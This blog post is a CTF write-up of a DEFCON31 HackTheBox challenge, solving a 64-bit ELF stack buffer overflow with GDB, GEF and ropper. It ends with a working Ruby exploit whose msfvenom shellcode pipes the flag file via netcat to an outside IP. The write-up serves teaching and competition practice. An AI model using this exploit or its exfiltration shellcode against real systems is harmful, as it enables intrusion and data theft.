<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>DEFCON31 - ELF 64-bit Stack Based Buffer Overflow | Security Lab</title>
<meta name="description" content="recently had the pleasure of attending DEFCON31 at Caesars Forum in Las Vegas. A few of us on the Red Team decided to…">


  <meta name="author" content="Royce Davis">
  
  <meta property="article:author" content="Royce Davis">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Security Lab">
<meta property="og:title" content="DEFCON31 - ELF 64-bit Stack Based Buffer Overflow">
<meta property="og:url" content="http://localhost:8080/_research/2023-09-05-defcon31-hackthebox-ctf/">


  <meta property="og:description" content="recently had the pleasure of attending DEFCON31 at Caesars Forum in Las Vegas. A few of us on the Red Team decided to…">





  <meta name="twitter:site" content="@SNSecurityLab">
  <meta name="twitter:title" content="DEFCON31 - ELF 64-bit Stack Based Buffer Overflow">
  <meta name="twitter:description" content="recently had the pleasure of attending DEFCON31 at Caesars Forum in Las Vegas. A few of us on the Red Team decided to…">
  <meta name="twitter:url" content="http://localhost:8080/_research/2023-09-05-defcon31-hackthebox-ctf/">

  
    <meta name="twitter:card" content="summary">
    
  

  
    <meta name="twitter:creator" content="@r3dy__">
  



  <meta property="article:published_time" content="2023-09-05T00:00:00-07:00">





  

  


<link rel="canonical" href="http://localhost:8080/_research/2023-09-05-defcon31-hackthebox-ctf/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "ServiceNow",
      "url": "http://localhost:8080/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="/assets/css/rouge.css">

<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
<link rel="preload" as="font" href="/assets/fonts/gilroy-regular-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/gilroy-semibold-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/gilroy-bold-webfont.woff2" type="font/woff2" crossorigin="anonymous"/>
<link rel="preload" as="font" href="/assets/fonts/fira-mono-regular-latin.woff2" type="font/woff2" crossorigin="anonymous"/>

<style>
@font-face {
  font-family: GilroyRegular;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-regular-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-regular-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: GilroySemiBold;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-semibold-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-semibold-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: GilroyBold;
  font-style: normal;
  font-weight: 400;
  src: url(/assets/fonts/gilroy-bold-webfont.woff2) format("woff2"),url(/assets/fonts/gilroy-bold-webfont.woff) format("woff");
  font-display: swap;
}

@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-regular-latin.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-regular-latin-ext.woff2) format('woff2');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-bold-latin.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
@font-face {
  font-family: 'Fira Mono';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url(/assets/fonts/fira-mono-bold-latin-ext.woff2) format('woff2');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
</style>



    <!-- start custom head snippets -->
<script src="https://assets.adobedtm.com/a441b904b50e/99538f40e7c0/launch-3dcaf3475e9d.min.js" async></script>
<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<style>
  @media screen and (width >= 725px) {
    .small-screen {
      display: none;
    }
    .large-screen { }
  }
  @media screen and (width < 725px) {
    .small-screen { }
    .large-screen {
      display: none;
    }
  }

  a {
    /*font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-size: 1rem;
    font-weight: 400;
  }

  .masthead__menu-item a {
    font-size: 0.8rem;
    margin: 0 0.25rem 0 0.25rem;
  }

  .masthead__menu-item_block a {
    white-space: nowrap;
    font-size: 0.8rem;
    color: rgb(255, 255, 255);
    background-color: rgb(41, 62, 64);
    padding-bottom: 0.4rem;
    padding-left: 0.6rem;
    padding-right: 0.6rem;
    padding-top: 0.4rem;
    position: relative;
  }

  .site-brand {
    align-items: center;
    background-color: rgba(0, 0, 0, 0);
    box-sizing: border-box;
    color: rgb(255, 255, 255);
    cursor: pointer;
    /*display: flex;*/
    /*font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-size: 1rem;
    font-weight: 400;
    height: 41px;
    line-height: 25px;
    margin-bottom: 0px;
    margin-left: 0px;
    margin-right: 16px;
    margin-top: 0px;
    outline-color: rgb(255, 255, 255);
    outline-style: none;
    outline-width: 0px;
    padding-bottom: 5px;
    padding-left: 9px;
    padding-right: 0px;
    padding-top: 5px;
    text-align: left;
    text-decoration-color: rgb(255, 255, 255);
    text-decoration-line: none;
    text-decoration-style: solid;
    text-decoration-thickness: auto;
    text-size-adjust: 100%;
    text-wrap: nowrap;
    touch-action: manipulation;
    white-space-collapse: collapse;
    width: auto;
    -webkit-box-align: center;
    -webkit-box-direction: normal;
    -webkit-font-smoothing: antialiased;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  }
  .small-screen a.site-brand {
    margin: 0px;
    padding: 0px;
  }

  .logo {
    border-right: 1px solid #000;
    height: 1.5rem;
    margin-right: 12px;
    min-width: 8rem;
    padding-bottom: 8px;
    padding-right: 12px;
    /*width: 180px;*/
  }

  .masthead__site-title {
    color: rgb(0, 0, 0);
    /*font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;*/
    font-family: Gilroy-Medium, "Century Gothic", CenturyGothic, sans-serif;
    font-weight: bold;
    font-size: 1rem;
  }

  ul {
    align-items: center;
  }
</style>

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu large-screen">
      <nav id="site-nav" class="greedy-nav large-screen">
        <a class="site-brand" href="/">
          
          <img class="logo" src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
          
          <span class="masthead__site-title">Security Lab</span>
        </a>
        <span class="visible-links">
          <span class="masthead__menu-item"><a href="/cvd" >CVD</a><a href="/snadvisories/" >SN Advisories</a><a href="/research/" >Research Blog</a><a href="/archive/" >Archive</a></span>
          <span class="masthead__menu-item_block">
            <a href="/get-involved" >Get Involved!</a>
          </span>
          
          <button class="search__toggle" type="button">
            <span class="visually-hidden">Toggle search</span>
            <img src="/assets/images/BUS_search-icon.svg" height="28" width="28" alt="Search">
          </button>
          
        </span>
      </nav>
    </div>
    <div class="masthead__menu small-screen">
      <nav id="site-nav" class="greedy-nav small-screen">
        <center><a class="site-brand" href="/">
          
          <img class="logo" src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
          
          <span class="masthead__site-title">Security Lab</span>
        </a></center>
        <center>
        <span class="visible-links">
          <span class="masthead__menu-item"><a href="/cvd" >CVD</a><a href="/snadvisories/" >SN Advisories</a><a href="/research/" >Research Blog</a><a href="/archive/" >Archive</a></span>
          <br>
          <span class="masthead__menu-item_block">
            <a href="/get-involved" >Get Involved!</a>
          </span>
          
          <button class="search__toggle" type="button">
            <span class="visually-hidden">Toggle search</span>
            <img src="/assets/images/BUS_search-icon.svg" height="28" width="28" alt="Search">
          </button>
          
        </span>
        </center>
      </nav>

    </div>
  </div>
</div>


    <div class="initial-content">
      







<div class="page__hero"
  style=" background-image: url('');"
>
  
    <img src="" alt="DEFCON31 - ELF 64-bit Stack Based Buffer Overflow" class="page__hero-image">
  
  
</div>



  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:8080/" itemprop="item"><span itemprop="name" class="breadcrumb_item">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">></span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/_research" itemprop="item"><span itemprop="name" class="breadcrumb_item">_research</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">></span>
      
    
      
      
        <li class="current">[ DEFCON31 - ELF 64-bit Stack Based Buffer Overflow ]</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="DEFCON31 - ELF 64-bit Stack Based Buffer Overflow">
    <meta itemprop="description" content="recently had the pleasure of attending DEFCON31 at Caesars Forum in Las Vegas. A few of us on the Red Team decided to…">
    <meta itemprop="datePublished" content="2023-09-05T00:00:00-07:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON31 - ELF 64-bit Stack Based Buffer Overflow
</h1>
          


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#defcon-31---elf-64-bit-stack-based-buffer-overflow">DEFCON 31 - ELF 64-bit Stack Based Buffer Overflow</a></li><li><a href="#1-initial-challenge-exploration">1. Initial challenge exploration</a></li><li><a href="#2-binary-analysis-using-gdb">2. Binary analysis using GDB</a><ul><li><a href="#21-first-impressions-inside-the-debugger">2.1. First Impressions inside the debugger</a></li><li><a href="#22-generating-a-crash-using-pattern-create">2.2. Generating a crash using “pattern create”</a></li></ul></li><li><a href="#3-custom-exploit-development">3. Custom exploit development</a><ul><li><a href="#31-finished-working-exploit">3.1. Finished working exploit</a></li></ul></li></ul>

            </nav>
            
          </aside>
        
        <h1 id="defcon-31---elf-64-bit-stack-based-buffer-overflow">DEFCON 31 - ELF 64-bit Stack Based Buffer Overflow</h1>

<p>I recently had the pleasure of attending DEFCON31 at Caesars Forum in Las Vegas.  A few of us on the Red Team decided to participate in one of the many CTFs being held there, <a href="https://ctf.hackthebox.com/event/details/hack-the-box-def-con-31-ctf-operation-cybershock-1082">Operation Cybershock CTF</a> brought to you by the fine folks at HackTheBox.</p>

<p><img src="/assets/images/posts/htblogo.jpg" alt="" /></p>

<p>There was no shortage of interesting and fun challenges to write about, however this article will focus on the “easy” 400pt pwn challenge named “Machine Gun Shelly”.  The following is a summary of our solution and how we arrived there.  The countless dead ends and wrong turns that we took along the way will be intentionally left out to keep this post as short.  The writing is intentionally brief as it is meant to be digestible in 5 to 10 minutes.</p>

<h1 id="1-initial-challenge-exploration">1. Initial challenge exploration</h1>
<p>This challenge began with an IP address and a port number.  If you were bold enough to connect blindly to the address and port with netcat you were greeted with a clever password prompt + some ASCII art.</p>

<p>Additionally, the challenge came with a zip file containing the following:</p>

<p><em>pwn__machine_gun_shelly.zip</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span>
├── build-docker.sh
├── challenge
│   ├── flag.txt
│   ├── glibc
│   │   ├── ld-linux-x86-64.so.2
│   │   └── libc.so.6
│   └── mgs
└── Dockerfile

2 directories, 6 files
</code></pre></div></div>
<p>If we run the binary with <code class="language-plaintext highlighter-rouge">./mgs</code> we can see the same prompt we got when connecting via netcat to the challenge IP and port. We don’t know the password so we’ll enter a bogus string just to allow the program to finish execution.</p>

<p><img src="/assets/images/posts/machinegunshelly01.png" alt="" /></p>

<p>Additionally we have everything we need to build a docker container which more or less mimics the challenge server on our local machine, presumably so we can debug+test some sort of exploit.  Here’s what was inside the Dockerfile.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM alpine:latest
RUN apk add <span class="nt">--no-cache</span> socat dash <span class="o">&amp;&amp;</span> <span class="nb">ln</span> <span class="nt">-sf</span> /usr/bin/dash /bin/sh
EXPOSE 1337
RUN addgroup <span class="nt">-S</span> ctf <span class="o">&amp;&amp;</span> adduser <span class="nt">-S</span> ctf <span class="nt">-G</span> ctf
COPY challenge/ /home/ctf/
WORKDIR /home/ctf
USER ctf
CMD <span class="o">[</span><span class="s2">"socat"</span>, <span class="s2">"tcp-l:1337,reuseaddr,fork"</span>, <span class="s2">"EXEC:./mgs"</span><span class="o">]</span>
</code></pre></div></div>

<h1 id="2-binary-analysis-using-gdb">2. Binary analysis using GDB</h1>
<p>You could certainly open up the <code class="language-plaintext highlighter-rouge">mgs</code> binary inside GDB with <code class="language-plaintext highlighter-rouge">gdb mgs</code> but we wanted to mimic the challenge server as closely as possible so we spun up the docker container HTB was kind enough to provide.</p>

<p>Rather than try and muck with the container and install hacker tools, we opted to execute the <code class="language-plaintext highlighter-rouge">socat</code> command directly as it’s written in the Dockerfile.  Now we can run <code class="language-plaintext highlighter-rouge">ps</code> to get a PID for socat and then run <code class="language-plaintext highlighter-rouge">gdb attach [PID]</code> to attach to the running process.  Since <code class="language-plaintext highlighter-rouge">mgs</code> is a child process spawned by socat we need to run the following in GDB.</p>

<blockquote>
  <p>set follow-fork-mode child</p>
</blockquote>

<p>This just tells GDB to keep debugging additional child processes that get spawned. Now we can interact with the binary via a netcat connection to port <code class="language-plaintext highlighter-rouge">1337</code> and still debug it using GDB.</p>

<h2 id="21-first-impressions-inside-the-debugger">2.1. First Impressions inside the debugger</h2>
<p>Inside gdb we can set a breakpoint within the main function with <code class="language-plaintext highlighter-rouge">b main</code> and then type <code class="language-plaintext highlighter-rouge">run</code> to allow the program to start its execution.  GDB tells us that execution has stopped at memory address <code class="language-plaintext highlighter-rouge">0x401a78 in main ()</code> (the breakpoint we just set), and we can disassemble this function by issuing the <code class="language-plaintext highlighter-rouge">disassem</code> command.</p>

<p><img src="/assets/images/posts/machinegunshelly02.png" alt="" /></p>

<p>We can see a lot going on inside this function including calls to multiple other functions within the binary.  Perhaps what’s most interesting at first glance though, is the call to a function named <strong>vuln</strong>.  Being that this is a hacker CTF we were immediately thinking this looks like a good place to investigate further.  Let’s set a breakpoint with <code class="language-plaintext highlighter-rouge">b vuln</code> and then continue program execution with <code class="language-plaintext highlighter-rouge">c</code>.</p>

<p><img src="/assets/images/posts/machinegunshelly03.png" alt="" /></p>

<p>After hitting our new breakpoint and running <code class="language-plaintext highlighter-rouge">disassem</code> again, we can see that the <strong>vuln</strong> function is pretty small. Other than the call to <strong>gets</strong>, which is part of libc and used to retrieve the password input from the user, the only interesting thing happening here is what looks like a pointer to a 16 byte buffer getting stored in <em>$rax</em>.  Or at least the intention of the program is to store 16 bytes (x10 in hexadecimal is 16 in decimal).  Given the following excerpt from the gets man page, maybe we can feed it more than 16 bytes and overflow the stack…</p>

<blockquote>
  <p>BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will
       continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets()
       instead.</p>
</blockquote>

<h2 id="22-generating-a-crash-using-pattern-create">2.2. Generating a crash using “pattern create”</h2>
<p>The simplest way to test this program for buffer overflows is to feed it a large string of characters when it asks us for the password.  First let’s create a pattern which we can use to calculate offsets later on in the debugging process.  GDB has a neat tool for this if you install the GDB Enhanced Features, or GEF for short, you can use <code class="language-plaintext highlighter-rouge">pattern create 100</code> to create a 100 byte predictable string.</p>

<ul>
  <li><a href="https://hugsy.github.io/gef/install/">GEF - GDB Enhanced Features documentation</a></li>
</ul>

<p><img src="/assets/images/posts/machinegunshelly04.png" alt="" /></p>

<p>Now we can copy this string to our clipboard, continue the program execution with <code class="language-plaintext highlighter-rouge">c</code> and paste in our 100 byte string to see what happens.</p>

<p>Jackpot, we’ve caused the program to crash!  This likely means that we’ve overwritten instructions in memory with garbage instructions from our input that the CPU doesn’t know how to execute.</p>

<p>There’s quite a bit going on with this next screenshot so let’s take a moment to unpack all the useful details we can see.</p>

<p><img src="/assets/images/posts/machinegunshelly05.png" alt="" /></p>

<ol>
  <li>
    <p>First, we appear to control the <strong>$rax</strong> register.  No surprise there, you’ll recall from our brief analysis of the <strong>vuln</strong> function that our buffer was intended to be stored there.</p>
  </li>
  <li>
    <p>We also have control over the <strong>$rbp</strong> register which contains 8 bytes from our string</p>
  </li>
  <li>
    <p>We don’t control <strong>$rip</strong> which would be needed for a text-book, easy mode buffer overflow</p>
  </li>
  <li>
    <p>We do seem to control <strong>$rsp</strong>, and more importantly a large chunk of our payload seems to exist here.  This will be the most likely place to store shellcode once we figure out how to execute it.</p>
  </li>
</ol>

<p>Let’s take a closer look at the call stack with <code class="language-plaintext highlighter-rouge">info stack</code></p>

<p><img src="/assets/images/posts/machinegunshelly06.png" alt="" /></p>

<p>We can see here that the next address on the stack is nothing more than the return instruction from the <strong>vuln</strong> function and everything after that
 appears to be contents from the payload we injected, specifically the portion that’s located in <strong>$rsp</strong> which appears to be directly after the 8 bytes that landed in <strong>$rbp</strong>.  That’s actually really convenient, if we can find a memory address to a <code class="language-plaintext highlighter-rouge">jmp rsp</code> or <code class="language-plaintext highlighter-rouge">call rsp</code> instruction we should be able to achieve code execution based on the following logic.</p>

<ol>
  <li>The instruction located at position <strong>#0</strong> of the stack calls <code class="language-plaintext highlighter-rouge">ret</code> and is then popped off the stack.  $rsp now points to <strong>#1</strong></li>
  <li>Position <strong>#1</strong> (which we control) should be a valid memory address to a <code class="language-plaintext highlighter-rouge">jmp rsp</code> or <code class="language-plaintext highlighter-rouge">call rsp</code> instruction which gets fed to <strong>ret</strong> and then popped off the stack.  Now $rsp points to <strong>#2</strong></li>
  <li>Any valid assembly located at <strong>#2</strong> should get executed via the <code class="language-plaintext highlighter-rouge">call rsp</code> or <code class="language-plaintext highlighter-rouge">jmp rsp</code> instruction</li>
</ol>

<h1 id="3-custom-exploit-development">3. Custom exploit development</h1>
<p>Now that we have an action plan we need to fill in a couple of missing pieces.  First we need to know the offset from our 100 byte string before stack position <strong>#1</strong> 0x6161616161616164  or “daaaaaaa” in ASCII. Once again we can use GEF to help us by typing <code class="language-plaintext highlighter-rouge">pattern offset  daaaaaaae</code> in our debugger.</p>

<p><img src="/assets/images/posts/machinegunshelly07.png" alt="" /></p>

<p>Perfect, so now we know that any valid memory address we place after the first 24 bytes will land on the stack just underneath the call to <code class="language-plaintext highlighter-rouge">ret</code> from the <strong>vuln</strong> function and get executed.  Assuming we can find a valid memory address to a <code class="language-plaintext highlighter-rouge">jmp rsp</code> or a <code class="language-plaintext highlighter-rouge">call rsp</code> instruction, the program should:</p>

<ul>
  <li>Call <code class="language-plaintext highlighter-rouge">ret</code> with our memory address pointing to a <code class="language-plaintext highlighter-rouge">jmp/call rsp</code> instruction</li>
  <li>Then pop that address off the stack (so now RSP points to the base of our shellcode)</li>
  <li>Execute the <code class="language-plaintext highlighter-rouge">jmp/call rsp</code> instruction and then execute our shellcode</li>
</ul>

<p>Our payload needs to look something like this.</p>

<p><strong>[24 bytes of padding][valid memory address][shellcode]</strong></p>

<p>Searching the binary for a <code class="language-plaintext highlighter-rouge">jmp</code> or <code class="language-plaintext highlighter-rouge">call</code> instruction pointing to <strong>$rsp</strong> is really easy using <em>ropper</em>.  Run the <code class="language-plaintext highlighter-rouge">ropper</code> command to open up the ropper console, type <code class="language-plaintext highlighter-rouge">file mgs</code> to load up the target binary and then type <code class="language-plaintext highlighter-rouge">search call rsp</code> to locate any and all matching instructions in the target binary.</p>

<p><img src="/assets/images/posts/machinegunshelly08.png" alt="" /></p>

<p>Awesome, there is a <code class="language-plaintext highlighter-rouge">call rsp;</code> instruction located at memory address <em>0x000000000041e81d</em>.  We now have everything we need to write a proof of concept exploit for this binary.</p>

<h2 id="31-finished-working-exploit">3.1. Finished working exploit</h2>
<p>I’m going to write this exploit in Ruby because the language is familiar to me, you could however write this exploit in just about any language that you’re competent in so don’t get caught up on the semantics.</p>

<p>Based on all of our analysis thus far we know the exploit code needs to do the following:</p>

<ol>
  <li>Open a TCP socket connected to a target IP and port number</li>
  <li>Receive the banner and prompt for input</li>
  <li>Create a payload with 24 bytes of padding</li>
  <li>Append the 0x000000000041e81d memory address to <code class="language-plaintext highlighter-rouge">call rsp</code></li>
  <li>Append a shellcode payload, generated from msfvenom for ease of use</li>
  <li>Send the payload</li>
</ol>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">#!/usr/bin/ruby</span>
<span class="nb">require</span> <span class="s1">'socket'</span>

 <span class="c1">#1. Open a TCP socket connected to a target IP and port number</span>
<span class="n">host</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

 <span class="c1">#2. Receive the banner and prompt for input</span>
<span class="k">while</span> <span class="n">line</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">gets</span><span class="p">.</span><span class="nf">chomp</span>
  <span class="nb">puts</span> <span class="n">line</span>
  <span class="k">break</span> <span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="nf">size</span> <span class="o">==</span> <span class="mi">8</span>
<span class="k">end</span>

 <span class="c1">#3. Create a payload with 24 bytes of padding</span>
<span class="n">padding</span>   <span class="o">=</span> <span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">24</span>

 <span class="c1">#4. Append the 0x000000000041e81d memory address to `call rsp`</span>
<span class="n">ret</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x1d\xe8\x41\x00\x00\x00\x00\x00</span><span class="s2">"</span>

 <span class="c1">#5. Append a shellcode payload, generated from msfvenom for ease of use</span>
 <span class="c1">#   msfvenom -p linux/x64/exec CMD="cat /home/ctf/flag.txt | nc X.X.X.X 54321" -f ruby</span>
<span class="n">buf</span> <span class="o">=</span>
  <span class="s2">"</span><span class="se">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x32\x00\x00\x00\x63</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x61\x74\x20\x2f\x68\x6f\x6d\x65\x2f\x63\x74\x66\x2f\x66</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x6c\x61\x67\x2e\x74\x78\x74\x20\x7c\x20\x6e\x63\x20\x31</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x34\x36\x2e\x31\x39\x30\x2e\x31\x36\x33\x2e\x31\x34\x37</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x20\x35\x34\x33\x32\x31\x00\x56\x57\x54\x5e\x6a\x3b\x58</span><span class="s2">"</span> <span class="o">+</span>
  <span class="s2">"</span><span class="se">\x0f\x05</span><span class="s2">"</span>

 <span class="c1">#6. Send the payload</span>
<span class="n">socket</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">padding</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div>

<p>If everything works we should be able to standup a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 54321, launch this exploit against our local docker container and receive the flag from the <code class="language-plaintext highlighter-rouge">mgs</code> binary which we hopefully tricked into executing our shellcode.</p>

<p><img src="/assets/images/posts/machinegunshelly10.png" alt="" /></p>

<p>Yay it works!  This was a super fun challenge, thanks HackTheBox for making it.  Thank you for reading this article, hope to see you at DEFCON 32!</p>

<p>~Royce Davis</p>

        
      </section>

      <footer class="page__meta">
        
        
      </footer>

      

      
    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <style>
  .page__footer {
    background-color: rgb(255, 255, 255);
    font-family: GilroyRegular, -apple-system, "system-ui", "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
  }

  div#footer {
    border-top: 1px solid #bfbfbf;
    margin-top: 0px;
  }

  .footer__inner-wrap {
    box-sizing: border-box;
    clear: both;
    color: rgb(0, 0, 0);
    display: flex;
    font-family: -apple-system, "system-ui", Roboto, "Segoe UI", "Helvetica Neue", "Lucida Grande", Arial, sans-serif;
    font-size: 1rem;
    height: 137.328px;
    justify-content: space-between;
    line-height: 1.2rem;
    margin-left: 0px;
    margin-right: 0px;
    max-width: 100%;
    padding-bottom: 20px;
    /*padding-left: 20px;
    padding-right: 20px;*/
    padding-top: 20px;
    text-size-adjust: 100%;
  }

  .col-12 {
    box-sizing: border-box;
    color: rgb(0, 0, 0);
    display: block;
    flex-basis: 100%;
    flex-grow: 0;
    flex-shrink: 0;
    float: none;
    font-family: GilroyRegular, -apple-system, "system-ui", "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    font-feature-settings: normal;
    font-kerning: auto;
    font-optical-sizing: auto;
    font-size: 0.5rem;
    font-stretch: 100%;
    font-style: normal;
    font-variant-alternates: normal;
    font-variant-caps: normal;
    font-variant-east-asian: normal;
    font-variant-ligatures: normal;
    font-variant-numeric: normal;
    font-variation-settings: normal;
    font-weight: 400;
    /* height: 864px; */
    letter-spacing: normal;
    line-height: 15px;
    margin-bottom: 0px;
    margin-left: 0px;
    margin-right: 0px;
    margin-top: 0px;
    max-width: 1700px;
    min-height: 1px;
    padding-bottom: 0px;
    padding-left: 40px;
    padding-right: 40px;
    padding-top: 0px;
    position: relative;
    text-align: left;
    text-size-adjust: 100%;
    /* width: 1293px; */
    -webkit-box-flex: 0;
    -webkit-font-smoothing: antialiased;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  }

  .row {
    color: rgb(0, 0, 0);
  }

  .logo-tagline-container {
    padding-left: 0;
    padding-right: 0;
    margin-left: 0px;
    margin-top: 0px;
    /*margin-bottom: 12px;*/
    line-height: 1.5;
    display: inline-block;
    text-align: center;
    color: rgb(0, 0, 0);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: bold;
    font-feature-settings: normal;
    font-kerning: auto;
    font-optical-sizing: auto;
    font-size: 0.8rem;
    font-stretch: 100%;
    font-style: normal;
    font-variant-alternates: normal;
    font-variant-caps: normal;
    font-variant-east-asian: normal;
    font-variant-ligatures: normal;
    font-variant-numeric: normal;
    font-variation-settings: normal;
    font-weight: 500;
  }

  @media screen and (width < 725px) {
    .logo-tagline-container {
      margin-left: auto;
      margin-right: auto;
      display: block;
